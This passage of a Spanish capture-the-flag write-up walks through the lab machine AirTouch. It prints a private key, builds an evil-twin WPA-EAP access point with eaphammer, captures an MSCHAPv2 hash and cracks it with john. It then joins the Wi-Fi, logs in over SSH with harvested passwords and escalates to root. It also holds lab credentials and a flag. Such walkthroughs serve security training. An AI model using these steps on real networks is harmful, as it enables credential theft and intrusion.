ZhppyMMmO0WHfU5uFBQNlNbNiRTGpb65ADhOPWYU0q/F1Y0HzpWKf6/Ci/vjZVfk
5T/r81lfQd+O/AAe4CZCmTevXvRvCiuOIgue3UEtwBxzt13ZMbtfCDiqdbnc4zWU
lvSxTvRk06RlJ0qhXYPs4c2Zbd8+Kw==
-----END CERTIFICATE-----
```

> server.crt

```
-----BEGIN CERTIFICATE-----
MIIEIDCCAwigAwIBAgIBAjANBgkqhkiG9w0BAQsFADCBmDELMAkGA1UEBhMCRVMx
DzANBgNVBAgTBk1hZHJpZDEPMA0GA1UEBxMGTWFkcmlkMREwDwYDVQQKEwhBaXJU
b3VjaDEeMBwGA1UECxMVQ2VydGlmaWNhdGUgQXV0aG9yaXR5MRQwEgYDVQQDEwtB
aXJUb3VjaCBDQTEeMBwGCSqGSIb3DQEJARYPY2FAQWlyVG91Y2guaHRiMB4XDTI0
MDIyNzE3MDc1NFoXDTM0MDIyNDE3MDc1NFowfDELMAkGA1UEBhMCRVMxDzANBgNV
BAcTBk1hZHJpZDERMA8GA1UEChMIQWlyVG91Y2gxDzANBgNVBAsTBlNlcnZlcjEU
MBIGA1UEAxMLQWlyVG91Y2ggQ0ExIjAgBgkqhkiG9w0BCQEWE3NlcnZlckBBaXJU
b3VjaC5odGIwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDGApRsL1Gh
Dfb0uKaXQm7+3ccEUwLtQewHbezXaFy/0u3gmb9XKupVaHJVHKr6kauDseEnKvWY
7mhvutzzdgls3KCnPJLSmextOT+5Uoe8LvRoDfhDcByta9OitGIUoVD3FucFPORh
JS917B5+Sl2BY5c5H8hc/8wt0pswF2OE++2FzlOrkuC4/aG3TYLZf4tlLT8wnJje
cVSxl2Z6STENN9OoKJQ5nIdhFDhhj471Fo2y1fBY2pM90t1JQZJdPlXLS16I3KpG
9l1kO1GQigG3nKpTB9lhzOhjE6kna+YykMD5e8TkYz5TXL6doSNCD4H2cdZ6nSao
7atAgQJVvMeVAgMBAAGjgY8wgYwwEQYJYIZIAYb4QgEBBAQDAgZAMAsGA1UdDwQE
AwIF4DAqBgNVHSUEIzAhBgorBgEEAYI3CgMDBglghkgBhvhCBAEGCCsGAQUFBwMB
MB0GA1UdDgQWBBQRq0Ftkn5OBDBNSNH86IC44hsHmjAfBgNVHSMEGDAWgBRnB0B7
qa/Iv+6VDjUMgJUionockTANBgkqhkiG9w0BAQsFAAOCAQEAWf8nBv7xq7rrGj+P
rvYlMaLoCdP7RRd1giSayn+ZY7qBeONdVOtUoynnTLWcv3fTVwcHhHCHUE7Ogw6L
wd95YQiYJ8Pqj1L4G5e7sW2tJRGd/fRZoGl56WU7t9KllZtMRbm4rId8FftYsaFl
8qznyLoRAfZLkIkycWRdIBru/6p/rvvxwyZGXT/cV5JFI6i9u54XUA6fYw2v8vJZ
fOJqWJGHRDS7ZeJBwVfCZuizrEwhnaJzZ6TNY9hXVqmWQVt4RgQdsIHKyVnkekt2
Fid4+Z9vAtafLYYkfNI+24LvLkP2+SHXz9h643acO6gjFUJcPvi45rId24gOKLza
LjUr5g==
-----END CERTIFICATE-----
```

> server.key

```
-----BEGIN PRIVATE KEY-----
MIIEvAIBADANBgkqhkiG9w0BAQEFAASCBKYwggSiAgEAAoIBAQDGApRsL1GhDfb0
uKaXQm7+3ccEUwLtQewHbezXaFy/0u3gmb9XKupVaHJVHKr6kauDseEnKvWY7mhv
utzzdgls3KCnPJLSmextOT+5Uoe8LvRoDfhDcByta9OitGIUoVD3FucFPORhJS91
7B5+Sl2BY5c5H8hc/8wt0pswF2OE++2FzlOrkuC4/aG3TYLZf4tlLT8wnJjecVSx
l2Z6STENN9OoKJQ5nIdhFDhhj471Fo2y1fBY2pM90t1JQZJdPlXLS16I3KpG9l1k
O1GQigG3nKpTB9lhzOhjE6kna+YykMD5e8TkYz5TXL6doSNCD4H2cdZ6nSao7atA
gQJVvMeVAgMBAAECggEAD25HiUfFvX6UWn1iVCLT+g4n8oUSkxFCVtDg9md2ZOeH
7Ksmn2EjilzdnhbiFy1Pd6+ey3ncUlrv7hcanWl7Mg3egjHlAj8HDvr5ZZSSKd7h
4pMGICFGRtiCkWkrxI5OvDa/cafNZ2mpsW+hb7eVYl4zvHqm12KC06ZYPC7ybTw+
isDev0zONSvC7tpiJkwpj88vi7BfD46qgg9UtUE7KVaPJcRG1vXVogIHAROihb7X
DKRPP+D00wU/ht8t5srOPuDjslEBfYx1/01ZynnQ3D4MGcP32mk/b+on69UI/daM
JihPRFuvo+q/6ERK2PE3lEA5lJwVGm5GvpR2WQzCAQKBgQD2N4DldSMaUy9WMxjw
uJbD6QSSpOR5HD9phbHA/l3YiaDj30z8hwc8feh3evXRdQf/URhXZGUaEZ7czsyU
f/i7v5RfovVV5uRQOTzK28TS5B+GH6qigsFmPadTIauDGxLNFkf88vw8tWaKJqd/
RbhN6NL/RKsctqMGuTGxsuGdlQKBgQDN4Liylj9hC+VfTCZiproYU0HU1wLI9V+k
SJ03FHCOgeymnHA+s51SA1SaycWU+vUQweMYpqejWpcL0CXH3moUA+nkyQWG5fs+
CfttI32ZsHf/u0/MzPhLCc/xONfqv5iepwrB9QnssoGCuKda3eyWNjTSlRyfKtnX
LKLdOSACAQKBgH8lLF/RvJ3UhSZbXq64c8qZYy4jDoToLGreimtiL64pbDcgUg45
4GfBkTFaAuT2LXoQM6S1iGwM21+lPwoUh6rUhNdaPJzujcpLtHQBR0OsYAcQBTrE
kQCuJ+ELCxm5+lyD/ArIo67p8hi3W1mi9EjvST5fBIngWpGXQu1DtbR9AoGAe2zw
DdDZqlqxZpKGqLn/8zlmzC0i9Et2zUzjQ/QzDpyBvdknyc9wz4xDmpDArXJOnX8/
oLW45swWpfRh0hNbUSiPfqOtdpRGLYlafLG8SPls15n6W3O+n24AhkNn3sqCuwq1
/lXjX04dKrt9SZKmld9lh6HxiNLtynxuH2Zx9AECgYBE89M7xJ2aYKAv/7mvVsGI
1jGtcFni4HAFC3LK3+SaJOGbdiGlEPm+PnJgFSSOOqQE/XPGJxU54TecfdypH2Gx
FLKDNzucqPoHUEsodLEjhxKVcdRyTZ2nR0xYoPtsIMYae6UDTt7xid2LX2JVNVdU
JJdbRQPWwm9HumAc28HUcg==
-----END PRIVATE KEY-----
```

#### Importación de certificados en eaphammer

Una vez creados los archivos con este contenido, ejecutamos los siguientes comandos para importar los certificados en `eaphammer`:

```shell
mkdir /root/certs1 # Depositar los certificados ahí
cd /root/eaphammer/
./eaphammer --cert-wizard import --ca-cert /root/certs1/ca.crt --server-cert /root/certs1/server.crt --private-key /root/certs1/server.key # Importamos los certificados primero
```

Resultado:

```
                     .__                                         
  ____ _____  ______ |  |__ _____    _____   _____   ___________ 
_/ __ \\__  \ \____ \|  |  \\__  \  /     \ /     \_/ __ \_  __ \
\  ___/ / __ \|  |_> >   Y  \/ __ \|  Y Y  \  Y Y  \  ___/|  | \/
 \___  >____  /   __/|___|  (____  /__|_|  /__|_|  /\___  >__|   
     \/     \/|__|        \/     \/      \/      \/     \/       


                        Now with more fast travel than a next-gen Bethesda game. >:D

                             Version:  1.14.0
                            Codename:  Final Frontier
                              Author:  @s0lst1c3
                             Contact:  gabriel<<at>>transmitengage.com

    
[?] Am I root?
[*] Checking for rootness...
[*] I AM ROOOOOOOOOOOOT
[*] Root privs confirmed! 8D
Case 1: Import all separate
[CW] Ensuring server cert, CA cert, and private key are valid...
/root/certs1/server.crt
/root/certs1/server.key
/root/certs1/ca.crt
[CW] Complete!
[CW] Loading private key from /root/certs1/server.key
[CW] Complete!
[CW] Loading server cert from /root/certs1/server.crt
[CW] Complete!
[CW] Loading CA certificate chain from /root/certs1/ca.crt
[CW] Complete!
[CW] Constructing full certificate chain with integrated key...
[CW] Complete!
[CW] Writing private key and full certificate chain to file...
[CW] Complete!
[CW] Private key and full certificate chain written to: /root/eaphammer/certs/server/AirTouch CA.pem
[CW] Activating full certificate chain...
[CW] Complete!
```

#### Ejecución del Evil Portal

Ahora ejecutamos la herramienta con los parámetros adecuados para clonar la red `AirTouch-Office`:

```shell
./eaphammer -i wlan2 --bssid AC:8B:A9:F3:A1:13 --essid "AirTouch-Office" --channel 44 --auth wpa-eap --creds
```

Resultado:

```
                     .__                                         
  ____ _____  ______ |  |__ _____    _____   _____   ___________ 
_/ __ \\__  \ \____ \|  |  \\__  \  /     \ /     \_/ __ \_  __ \
\  ___/ / __ \|  |_> >   Y  \/ __ \|  Y Y  \  Y Y  \  ___/|  | \/
 \___  >____  /   __/|___|  (____  /__|_|  /__|_|  /\___  >__|   
     \/     \/|__|        \/     \/      \/      \/     \/       


                        Now with more fast travel than a next-gen Bethesda game. >:D

                             Version:  1.14.0
                            Codename:  Final Frontier
                              Author:  @s0lst1c3
                             Contact:  gabriel<<at>>transmitengage.com

    
[?] Am I root?
[*] Checking for rootness...
[*] I AM ROOOOOOOOOOOOT
[*] Root privs confirmed! 8D
[*] Saving current iptables configuration...
[*] Reticulating radio frequency splines...
Error: Could not create NMClient object: Could not connect: No such file or directory.

[*] Using nmcli to tell NetworkManager not to manage wlan2...

100%|█████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 1/1 [00:01<00:00,  1.00s/it]

[*] Success: wlan2 no longer controlled by NetworkManager.
[!] The hw_mode specified in hostapd.ini is invalid for the selected channel (g, 44)
[!] Falling back to hw_mode: a
[*] WPA handshakes will be saved to /root/eaphammer/loot/wpa_handshake_capture-2026-01-21-11-04-38-EGYG9BFDomgkzE7v1JL2OPKqSYnhCNOP.hccapx

[hostapd] AP starting...

Configuration file: /root/eaphammer/tmp/hostapd-2026-01-21-11-04-38-Qi4lihzjOT1SolZzgu0DJVpXs9BKgWGv.conf
rfkill: Cannot open RFKILL control device
wlan2: interface state UNINITIALIZED->COUNTRY_UPDATE
Using interface wlan2 with hwaddr ac:8b:a9:f3:a1:13 and ssid "AirTouch-Office"
wlan2: interface state COUNTRY_UPDATE->ENABLED
wlan2: AP-ENABLED 


Press enter to quit...
```

Tras unos segundos, comenzaremos a ver intentos de autenticación de los usuarios que se conectan a nuestro AP falso. Debemos esperar hasta que se capture un `hash`.

```
wlan2: STA 28:6c:07:12:ee:f3 IEEE 802.11: authenticated
wlan2: STA 28:6c:07:12:ee:a1 IEEE 802.11: authenticated
wlan2: STA 28:6c:07:12:ee:a1 IEEE 802.11: authenticated
wlan2: STA 28:6c:07:12:ee:f3 IEEE 802.11: authenticated
wlan2: STA 28:6c:07:12:ee:f3 IEEE 802.11: associated (aid 1)
wlan2: CTRL-EVENT-EAP-STARTED 28:6c:07:12:ee:f3
wlan2: CTRL-EVENT-EAP-PROPOSED-METHOD vendor=0 method=1
wlan2: CTRL-EVENT-EAP-RETRANSMIT 28:6c:07:12:ee:f3
wlan2: CTRL-EVENT-EAP-RETRANSMIT 28:6c:07:12:ee:f3
wlan2: CTRL-EVENT-EAP-RETRANSMIT 28:6c:07:12:ee:f3
wlan2: STA 28:6c:07:12:ee:f3 IEEE 802.11: authenticated
wlan2: STA 28:6c:07:12:ee:a1 IEEE 802.11: authenticated
wlan2: STA 28:6c:07:12:ee:a1 IEEE 802.11: associated (aid 2)
wlan2: CTRL-EVENT-EAP-STARTED 28:6c:07:12:ee:a1
wlan2: CTRL-EVENT-EAP-PROPOSED-METHOD vendor=0 method=1
wlan2: CTRL-EVENT-EAP-PROPOSED-METHOD vendor=0 method=25


mschapv2: Wed Jan 21 11:06:13 2026
	domain\username:		AirTouch\r4ulcl
	username:			r4ulcl
	challenge:			d9:d3:e2:93:44:38:81:5c
	response:			d7:ef:29:1b:ce:1e:66:53:ec:24:85:fc:45:6d:c7:4a:f1:56:72:67:b4:3b:69:c6

	jtr NETNTLM:			r4ulcl:$NETNTLM$d9d3e2934438815c$d7ef291bce1e6653ec2485fc456dc74af1567267b43b69c6

	hashcat NETNTLM:		r4ulcl::::d7ef291bce1e6653ec2485fc456dc74af1567267b43b69c6:d9d3e2934438815c


wlan2: CTRL-EVENT-EAP-FAILURE 28:6c:07:12:ee:a1
```

Aquí podemos ver que hemos obtenido correctamente el `hash` del usuario `r4ulcl`.

### John (Crack Hash)

Guardamos el hash capturado en un archivo y procedemos a crackearlo con `john`:

```shell
# Guardar el hash en un archivo
echo "r4ulcl:\$NETNTLM\$d9d3e2934438815c\$d7ef291bce1e6653ec2485fc456dc74af1567267b43b69c6" > hash

john --format=netntlm hash --wordlist=<WORDLIST>
```

Resultado:

```
Using default input encoding: UTF-8
Loaded 1 password hash (netntlm, NTLMv1 C/R [MD4 DES (ESS MD5) 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=4
Press 'q' or Ctrl-C to abort, almost any other key for status
laboratory       (r4ulcl)     
1g 0:00:00:00 DONE (2026-01-21 06:14) 50.00g/s 4636Kp/s 4636Kc/s 4636KC/s ragde..ivan23
Use the "--show --format=netntlm" options to display all of the cracked passwords reliably
Session completed.
```

Vemos que el crackeo ha funcionado correctamente, obteniendo la contraseña del usuario.

### Conectar a WiFi AirTouch-Office

Con las credenciales válidas, nos conectamos ahora a la red `AirTouch-Office`:

```shell
ip link set wlan3 up
cp /root/certs1/ca.crt /tmp/ca.crt
cat > /tmp/wifi_office.conf << 'EOF'
network={
    ssid="AirTouch-Office"
    key_mgmt=WPA-EAP
    eap=PEAP
    identity="AirTouch\r4ulcl"
    password="laboratory"
    ca_cert="/tmp/ca.crt"
    phase1="peaplabel=0"
    phase2="auth=MSCHAPV2"
}
EOF
wpa_supplicant -i wlan3 -c /tmp/wifi_office.conf -B -f /tmp/wpa_office.log
iw dev wlan3 link
```

Resultado:

```
Connected to ac:8b:a9:aa:3f:d2 (on wlan3)
	SSID: AirTouch-Office
	freq: 5220
	RX: 4571 bytes (26 packets)
	TX: 1620 bytes (16 packets)
	signal: -30 dBm
	rx bitrate: 6.0 MBit/s
	tx bitrate: 24.0 MBit/s

	bss flags:	short-slot-time
	dtim period:	2
	beacon int:	100
```

Solicitamos ahora una `IP` mediante `DHCP`:

```shell
dhclient wlan3 -v
```

Resultado:

```
Internet Systems Consortium DHCP Client 4.4.1
Copyright 2004-2018 Internet Systems Consortium.
All rights reserved.
For info, please visit https://www.isc.org/software/dhcp/

Listening on LPF/wlan3/02:00:00:00:03:00
Sending on   LPF/wlan3/02:00:00:00:03:00
Sending on   Socket/fallback
DHCPDISCOVER on wlan3 to 255.255.255.255 port 67 interval 3 (xid=0xcd5b20f)
DHCPOFFER of 10.10.10.74 from 10.10.10.1
DHCPREQUEST for 10.10.10.74 on wlan3 to 255.255.255.255 port 67 (xid=0xfb2d50c)
DHCPACK of 10.10.10.74 from 10.10.10.1 (xid=0xcd5b20f)
bound to 10.10.10.74 -- renewal in 403353 seconds.
```

Con esto confirmamos que estamos dentro de la red y contamos con la IP `10.10.10.74`.

### SSH (remote)

<figure><img src="../../.gitbook/assets/vulnCard_airtouch9.png" alt=""><figcaption></figcaption></figure>

Ya dentro de la red `wifi`, nos conectamos por `SSH` usando las credenciales obtenidas previamente del script `send_certs.sh`:

```shell
ssh remote@10.10.10.1
```

Introducimos la contraseña `xGgWEwqUpfoOVsLeROeG` y comprobamos el acceso:

```
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-216-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

remote@AirTouch-AP-MGT:~$ whoami
remote
```

Veremos que estaremos dentro de forma correcta.

## Escalate Privileges

Investigando los procesos, observamos que `hostapd` (Host Access Point Daemon) se está ejecutando y controla la autenticación de la `WiFi empresarial`.

Buscamos archivos relacionados:

```shell
find / -name "hostapd_wpe.*" 2>/dev/null
```

Estos apuntan al directorio `/etc/hostapd/`, que listamos:

```shell
ls -la /etc/hostapd/
```

Resultado:

```
total 196
drwxr-xr-x 1 root root  4096 Jan 13 14:55 .
drwxr-xr-x 1 root root  4096 Jan 21 04:37 ..
-rwxr-xr-x 1 root root 83947 Mar 27  2024 hostapd_wpe.conf.tmp
-rwxr-xr-x 1 root root  4824 Mar 27  2024 hostapd_wpe.eap_user
-rwxr-xr-x 1 root root 83948 Mar 27  2024 hostapd_wpe2.conf.tmp
-rwxr-xr-x 1 root root  3129 Aug 13  2019 ifupdown.sh
```

Al revisar los archivos, el que más nos llama la atención es `hostapd_wpe.eap_user`, ya que actúa como base de datos local para la autenticación de usuarios a nivel de red:

```
# Phase 1 users
#"user"		MD5	"password"
#"test user"	MD5	"secret"
#"example user"	TLS
#"DOMAIN\user"	MSCHAPV2	"password"
#"gtc user"	GTC	"password"
#"pax user"	PAX	"unknown"
#"pax.user@example.com"	PAX	0123456789abcdef0123456789abcdef
#"psk user"	PSK	"unknown"
#"psk.user@example.com"	PSK	0123456789abcdef0123456789abcdef
#"sake.user@example.com"	SAKE	0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef
#"ttls"		TTLS
#"not anonymous"	PEAP
# Default to EAP-SIM and EAP-AKA based on fixed identity prefixes
#"0"*		AKA,TTLS,TLS,PEAP,SIM
#"1"*		SIM,TTLS,TLS,PEAP,AKA
#"2"*		AKA,TTLS,TLS,PEAP,SIM
#"3"*		SIM,TTLS,TLS,PEAP,AKA
#"4"*		AKA,TTLS,TLS,PEAP,SIM
#"5"*		SIM,TTLS,TLS,PEAP,AKA
#"6"*		AKA'
#"7"*		AKA'
#"8"*		AKA'

# Wildcard for all other identities
#*		PEAP,TTLS,TLS,SIM,AKA

# Phase 2 (tunnelled within EAP-PEAP or EAP-TTLS) users
#"t-md5"		MD5	"password"	[2]
#"DOMAIN\t-mschapv2"	MSCHAPV2	"password"	[2]
#"t-gtc"		GTC	"password"	[2]
#"not anonymous"	MSCHAPV2	"password"	[2]
#"user"		MD5,GTC,MSCHAPV2	"password"	[2]
#"test user"	MSCHAPV2	hash:000102030405060708090a0b0c0d0e0f	[2]
#"ttls-user"	TTLS-PAP,TTLS-CHAP,TTLS-MSCHAP,TTLS-MSCHAPV2	"password"	[2]

# Default to EAP-SIM and EAP-AKA based on fixed identity prefixes in phase 2
#"0"*		AKA	[2]
#"1"*		SIM	[2]
#"2"*		AKA	[2]
#"3"*		SIM	[2]
#"4"*		AKA	[2]
#"5"*		SIM	[2]
#"6"*		AKA'	[2]
#"7"*		AKA'	[2]
#"8"*		AKA'	[2]

# WPE - DO NOT REMOVE - These entries are specifically in here 
*		PEAP,TTLS,TLS,FAST
#"t"	   TTLS-PAP,TTLS-CHAP,TTLS-MSCHAP,MSCHAPV2,MD5,GTC,TTLS,TTLS-MSCHAPV2  "t"	[2]

*	PEAP,TTLS,TLS,FAST [ver=1]
#"t"	GTC,TTLS-PAP,TTLS-CHAP,TTLS-MSCHAP,MSCHAPV2,MD5,GTC,TTLS,TTLS-MSCHAPV2 "password" [2]

"AirTouch\r4ulcl"			   MSCHAPV2		"laboratory" [2]
"admin"			               MSCHAPV2		"xMJpzXt4D9ouMuL3JJsMriF7KZozm7" [2]
```

En la parte inferior encontramos credenciales para los usuarios `admin` y `r4ulcl`:

```
User: admin
Pass: xMJpzXt4D9ouMuL3JJsMriF7KZozm7
```

Comprobamos que existe el usuario `admin` a nivel de sistema y escalamos a él:

```shell
su admin
```

Metemos como contraseña `xMJpzXt4D9ouMuL3JJsMriF7KZozm7`...

```
admin@AirTouch-AP-MGT:/etc/hostapd$ whoami
admin
```

Tras autenticarnos, verificamos permisos con `sudo -l`:

```
Matching Defaults entries for admin on AirTouch-AP-MGT:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User admin may run the following commands on AirTouch-AP-MGT:
    (ALL) ALL
    (ALL) NOPASSWD: ALL
```

Vemos que el usuario `admin` puede ejecutar cualquier comando, por lo que escalamos directamente a `root`:

```shell
sudo su
```

Resultado:

```
root@AirTouch-AP-MGT:/etc/hostapd# whoami
root
```

Finalmente, leemos la `flag` de `root` y damos por terminada la máquina.

> root.txt

```
8021217eccf397da333429213effa4a2
```
